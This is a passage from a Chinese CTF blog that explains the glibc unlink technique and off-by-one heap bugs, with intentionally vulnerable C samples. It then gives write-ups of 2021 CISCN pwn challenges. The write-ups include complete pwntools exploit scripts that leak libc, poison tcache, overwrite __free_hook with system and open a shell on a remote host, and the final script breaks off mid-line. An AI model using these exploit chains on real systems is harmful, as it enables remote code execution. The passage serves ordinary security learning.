class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span><br><span class="line">                               P, AV);</span><br></pre></td></tr></table></figure>
-<p>这里我们以32位为例，假设堆内存最初的布局是下面的样子<br><img src="/2021/06/11/Unlink/2.png" alt="2.png"><br>现在有物理空间连续的两个chunk（Q,Nextchunk），其中Q处于使用状态、Nextchunk<br>处于释放状态。那么如果我们通过某种方式（比如溢出）将Nextchunk的fd和bk指针修改为<br>指定的值。则当我们free(Q)时<br>①glibc判断这个块是small chunk<br>②判断向前合并，发现前一个chunk处于使用状态，不需要向前合并<br>③判断向后合并，发现后一个chunk处于空闲状态，需要合并<br>④继而对Nextchunk采取unlink操作<br>那么unlink具体执行的效果是什么样子呢？<br>①FD=P-&gt;fd = target addr -12<br>②BK=P-&gt;bk = expect value<br>③FD-&gt;bk = BK，即 *(target addr-12+12)=BK=expect value<br>④BK-&gt;fd = FD，即 *(expect value +8) = FD = target addr-12<br>看起来我们似乎可以通过unlink直接实现任意地址读写目的，但是我们还是需要确保expect<br>value+8的地址具有可写权限。</p>
-<p>比如说我们将target addr 设置成某个got表项，那么当程序调用对应的Libc函数时，就会直接<br>执行我们设置的值（expect value）处的代码。需要注意的是，expect value+8处的值被破坏<br>了，需要想办法绕过。</p>
-<h3 id="当前的unlink"><a href="#当前的unlink" class="headerlink" title="当前的unlink"></a>当前的unlink</h3><p>我们刚才考虑的是没有检查的情况，但是一旦加上检查，就没有这么简单了。我们对比一下<br>fd和bk的检查</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fd bk</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br></pre></td></tr></table></figure>
-<p>此时<br>①FD-&gt;bk = target addr - 12 + 12=target_addr<br>②BK-&gt;fd = expect value + 8<br>那么我们上面所利用的修改GOT表项的方法就可能不可用了。但是我们可以通过伪造的方式<br>绕过这个机制。<br>首先我们通过覆盖，将nextchunk的FD指针指向了fakeFD，将nextchunk的BX指针指向了<br>fakeBK。那么为了通过验证，我们需要<br>①fakeFD -&gt; bk == P &lt;=&gt; *(fakeFD + 12) == P<br>②fakeBK -&gt; fd == P &lt;=&gt; *(fakeBK + 8) == P<br>当满足上述两个式子时，可以进入unlink环节，进行如下操作：<br>①fakeFD -&gt; bk = fakeBK &lt;=&gt; <em>(fakeFD + 12) = fakeBK<br>②fakeBK -&gt; fd = fakeFD &lt;=&gt; <em>(fakeBK + 8) = fakeFD<br>如果让fakeFD+12和fakeBK+8指向同一个指向P的指针，那么：<br>①</em>P = P - 8<br>②</em>P = P - 12<br>即通过此方式，P的指针指向了比自己低12的地址处。此方法虽然不可以实现任意地址写，<br>但是可以修改指向chunk的指针，这样的修改是可以达到一定的效果的。</p>
-<p>如果我们想要使得两者都指向P，只需要按照如下方式修改即可<br><img src="/2021/06/11/Unlink/3.png" alt="3.png"><br>需要注意的是，这里我们并没有违背下面的约束，因为P在unlink前是指向正确的chunk的<br>指针。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。</span></span><br><span class="line">   <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">     malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);               \</span><br></pre></td></tr></table></figure>
-<p><strong>此外，其实如果我们设置next chunk的fd和bk均为nextchunk的地址也是可以绕过上面的<br>检测的。但是这样的话，并不能达到修改指针内容的效果。</strong></p>
-<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><h5 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h5><p>1、UAF，可修改free状态下smallbin或是unsorted bin 的fd和Bk指针<br>2、一直位置存在一个指针指向可进行UAF的chunk</p>
-<h5 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h5><p>使得已指向UAF chunk的指针ptr变为ptr-0x18</p>
-<h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>设指向可UAF chunk的指针的地址为ptr<br>①修改fd为 ptr-0x18<br>②修改bk为ptr-0x10<br>③触发unlink<br>ptr处的指针会变为Ptr-0x18</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/06/11/Unlink/" data-id="ckptiht2m00002cu61v1t7jhd" data-title="Unlink" class="article-share-link">分享</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-off-by-one" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/06/11/off-by-one/" class="article-date">
-  <time class="dt-published" datetime="2021-06-11T15:40:43.000Z" itemprop="datePublished">2021-06-11</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/06/11/off-by-one/">Off-by-One</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="堆溢出之off-by-one"><a href="#堆溢出之off-by-one" class="headerlink" title="堆溢出之off by one"></a>堆溢出之off by one</h1><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>严格来说off-by-one漏洞是一种特殊的溢出漏洞，off by one 指向缓冲区中写入时，写入<br>的字节数超过了这个缓冲区本身所申请的字节数并且只越界了一个字节。</p>
-<h3 id="off-by-one-漏洞原理"><a href="#off-by-one-漏洞原理" class="headerlink" title="off by one 漏洞原理"></a>off by one 漏洞原理</h3><p>off by one是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，<br>当然也不排除写入的size就只多了一个字节的情况。其中边界验证不严通常包括：</p>
-<p>①使用循环语句向堆块中写入数据时，循环的次数设置错误导致多写入了一个字节<br>②字符串操作不合适</p>
-<p>一般来说，单字节溢出被认为是难以利用的，但是因为Linux的堆管理机制ptmalloc验证的<br>松散性，基于linux堆的off-by-one漏洞利用起来并不复杂，并且威力强大。此外，需要说明<br>的一点是off-by-one是可以基于各种缓冲区的，比如栈、bss段等，但在堆上的off by one<br>是CTF中比较常见的。</p>
-<h3 id="off-by-one利用思路"><a href="#off-by-one利用思路" class="headerlink" title="off-by-one利用思路"></a>off-by-one利用思路</h3><p>1、溢出字节为可控制字节：通过修改大小造成结构之间出现重叠，从而泄露出其他块数据，<br>或是覆盖其他块数据。也可使用NULL字节溢出的方法。</p>
-<p>2、溢出字节为NULL字节：在size为0x100的时候，溢出NULL字节可以使得prev_in_use位<br>被清，这样前块会被认为是free块。<br>(1)这时可以选择使用unlink方法进行处理<br>(2)另外，这时prev_size域就会启用，就可以伪造prev_size，从而造成块之间发生重叠。此<br>方法的关键在于unlink的时候没有检查按照prev_size找到的块的大小与prev_size是否一致。</p>
-<p>示例1<br>C</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">my_gets</span><span class="params">(<span class="keyword">char</span> *ptr,<span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=size;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ptr[i]=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *chunk1,*chunk2;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    chunk2=<span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Get Input:&quot;</span>);</span><br><span class="line">    my_gets(chunk1,<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>my_gets函数导致了一个off by one 漏洞，原因是for循环的边界没有控制好导致写入多执行<br>了一次，这也被称为栅栏错误。</p>
-<p>我们使用gdb对程序进行调试，在进行输入前可以看到分配的两个用户区域为16字节的堆块</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000021 &lt;=== chunk2</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure>
-<p>当我们执行my_gets进行输入之后，可以看到数据发生了溢出覆盖到了下一个堆块的prev_size<br>域print ‘A’*17</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1</span><br><span class="line">0x602010:   0x4141414141414141  0x4141414141414141</span><br><span class="line">0x602020:   0x0000000000000041  0x0000000000000021 &lt;=== chunk2</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure>
-
-<p>示例2<br>第二种常见的导致off-by-one的场景就是字符串操作了，常见的原因就是字符串的结束符<br>计算有误</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">40</span>]=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">void</span> *chunk1;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Get Input&quot;</span>);</span><br><span class="line">    gets(buffer);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(buffer)==<span class="number">24</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(chunk1,buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>程序咋看上去没有任何问题，但是strlen和strcpy的行为不一致却导致了off-by-one的发生。<br>strlen是我们很熟悉的计算ascii字符串长度的函数，这个函数在计算字符串长度时是不把结束符<br>‘\x00’计算在内的，但是strcpy在复制字符串时会拷贝结束符’\x00’。这就导致了我们向chunk1<br>中写入了25个字节，我们使用gdb进行调试可以看到这一点。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000411 &lt;=== next chunk</span><br></pre></td></tr></table></figure>
-<p>我们输入’A’*24后执行strcpy</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021</span><br><span class="line">0x602010:   0x4141414141414141  0x4141414141414141</span><br><span class="line">0x602020:   0x4141414141414141  0x0000000000000400</span><br></pre></td></tr></table></figure>
-<p>可以看到next chunk的size域低字节被结束符’\x00’覆盖，这种有属于Off by one 的一个分支<br>称为NULL byte off by one ，在后面我们会看到off-by-one与NULL byte off-by-one在<br>利用上的区别。还是有一点就是为什么是低字节被覆盖呢，因为我们通常使用的CPU的字节<br>序都是小端法的，比如DWORD值在使用小端法的内存中是这样存储的</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DWORD 0x41424344</span><br><span class="line">内存  0x44,0x43,0x42,0x41</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/06/11/off-by-one/" data-id="ckpth97xj0000c8u68cdn5dxq" data-title="Off-by-One" class="article-share-link">分享</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-2021CISCN-PWN题" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/06/05/2021CISCN-PWN%E9%A2%98/" class="article-date">
-  <time class="dt-published" datetime="2021-06-06T02:13:20.000Z" itemprop="datePublished">2021-06-06</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/06/05/2021CISCN-PWN%E9%A2%98/">2021CISCN_PWN题</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>大佬博客：<a target="_blank" rel="noopener" href="https://nuoye-blog.github.io/2021/05/16/466a7375/">https://nuoye-blog.github.io/2021/05/16/466a7375/</a></p>
-<h2 id="pwny"><a href="#pwny" class="headerlink" title="pwny"></a>pwny</h2><p>write的时候可以越界，第一次读入到0x202860处使fd非法，从而在第二次读入时会写入0，这样就可以做到写入操作。<br>通过read越界读取出libc，然后越界写入system地址到exit退出时调用的地址，并将参数修改为/bin/sh，退出程序即可getshell。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(<span class="string">&quot;124.71.230.240&quot;</span>,<span class="string">&quot;26157&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;pwny&quot;</span>).libc</span><br><span class="line">def write_s(idx):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">def read_s(idx):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">	p.send(p64(idx))</span><br><span class="line">write_s(0x100)</span><br><span class="line">write_s(0x100)</span><br><span class="line">read_s(0xFFFFFFFFFFFFFFFC)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Result: &quot;</span>)</span><br><span class="line">libc.address = int(p.recv(12),16) -0x3ec680</span><br><span class="line"><span class="built_in">print</span> hex(libc.address)</span><br><span class="line">read_s(0xFFFFFFFFFFFFFFF5)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Result: &quot;</span>)</span><br><span class="line">pie = int(p.recv(12),16)+0x58</span><br><span class="line"><span class="built_in">print</span> hex(pie)</span><br><span class="line">one = [0x4f3d5,0x4f432,0x10a41c]</span><br><span class="line">write_s((libc.address+0x61b968 - pie)/8)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">write_s((libc.address+0x61bf60 - pie)/8)</span><br><span class="line">p.sendline(p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b _dl_fini&#x27;)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<h2 id="lonelywolf"><a href="#lonelywolf" class="headerlink" title="lonelywolf"></a>lonelywolf</h2><p>只有一个堆块的操作，存在UAF，修改tcache结构，使获得一个指向size位（0x80)及一个指向fd的tcache，并且设置0x90的tcache为8，然后利用上面的两个tcache修改其size为0x90，并free掉，这样即可获得libc地址。<br>然后利用UAF申请到__free_hook并修改为system地址，即可getshell。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(<span class="string">&quot;lonelywolf&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&quot;124.71.230.240&quot;</span>,<span class="string">&quot;26077&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;lonelywolf&quot;</span>).libc</span><br><span class="line">def add(size):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">	p.sendline(str(0))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">def edit(data):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">	p.sendline(str(0))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">	p.send(data)</span><br><span class="line">def show():</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">	p.sendline(str(0))</span><br><span class="line">def free():</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">	p.sendline(str(0))</span><br><span class="line">add(0x78)</span><br><span class="line">free()</span><br><span class="line">edit(<span class="string">&#x27;\x00&#x27;</span>*0x10+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">heap = u64(p.recv(6)+<span class="string">&#x27;\x00\x00&#x27;</span>)-0x260</span><br><span class="line"><span class="built_in">print</span> hex(heap)</span><br><span class="line">edit(p64(heap+0x10)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(0x78)</span><br><span class="line">add(0x78)</span><br><span class="line">edit(p32(0)+<span class="string">&#x27;\x00\x01\x01\x08&#x27;</span>+p64(0)*10+p64(heap+0x250)*3+p64(heap+0x260))</span><br><span class="line">add(0x68)</span><br><span class="line">edit(p64(0)+p64(0x91)+p64(0)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(0x38)</span><br><span class="line">edit(<span class="string">&#x27;\x00&#x27;</span>*0x8+p64(0x31)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(0x78)</span><br><span class="line">free()</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">libc.address = u64(p.recv(6)+<span class="string">&#x27;\x00\x00&#x27;</span>)-0x3ebca0</span><br><span class="line"><span class="built_in">print</span> hex(libc.address)</span><br><span class="line">add(0x28)</span><br><span class="line">free()</span><br><span class="line">edit(p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]-8)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(0x28)</span><br><span class="line">add(0x28)</span><br><span class="line">edit(<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="silverwolf"><a href="#silverwolf" class="headerlink" title="silverwolf"></a>silverwolf</h2><p>劫持步骤同上，达到任意地址申请的目的后，申请到environ变量获取栈地址，从而将栈返回地址覆盖为我们的rop串，实现orw。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"><span class="comment">#p = process(&quot;silverwolf&quot;)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&quot;124.71.230.240&quot;</span>,<span class="string">&quot;26121&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;silverwolf&quot;</span>).libc</span><br><span class="line">def add(size):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">	p.sendline(str(0))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">def edit(data):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">	p.sendline(str(0))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">	p.send(data)</span><br><span class="line">def show():</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">	p.sendline(str(0))</span><br><span class="line">def free():</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">	p.sendline(str(0))</span><br><span class="line">add(0x78)</span><br><span class="line">free()</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">heap = u64(p.recv(6)+<span class="string">&#x27;\x00\x00&#x27;</span>)-0x1170</span><br><span class="line"><span class="built_in">print</span> hex(heap)</span><br><span class="line"></span><br><span class="line">edit(p64(heap+0x10)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(0x78)</span><br><span class="line">add(0x78)</span><br><span class="line">edit(<span class="string">&#x27;\x00&#x27;</span>*0x78)</span><br><span class="line">add(0x78)</span><br><span class="line">free()</span><br><span class="line">edit(p64(heap+0x10)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(0x78)</span><br><span class="line">add(0x78)</span><br><span class="line">edit(p32(0)+<span class="string">&#x27;\x01\x01\x04\x08&#x27;</span>+p64(0)*10+p64(heap+0xe50)+p64(heap+0xe50+0x80)+p64(heap+0xe40)+p64(heap+0xe50))</span><br><span class="line">add(0x68)</span><br><span class="line">edit(p64(0)+p64(0x91)+p64(0)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(0x58)</span><br><span class="line">edit(p64(0)+p64(0x81)+p64(0)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(0x78)</span><br><span class="line">free()</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: 